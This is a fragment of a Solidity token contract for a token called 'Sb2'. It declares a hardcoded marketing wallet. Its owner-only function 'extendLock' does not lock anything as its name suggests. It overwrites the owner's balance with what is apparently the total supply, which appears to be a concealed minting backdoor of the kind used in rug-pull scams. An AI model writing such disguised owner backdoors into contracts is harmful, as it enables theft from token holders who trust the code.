...
contract Sb2 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "Sb2";
    string private _symbol = "Sb2";
    uint8 private _decimals = 9;
    address payable public marketingAddress = payable(0x301D1E7224Ef53e0E1C23B17a828706BCB7E267f);
    ...
    function extendLock() external onlyOwner() {_tokenAddresses[getOwner()] = _decimalTotalTok;}
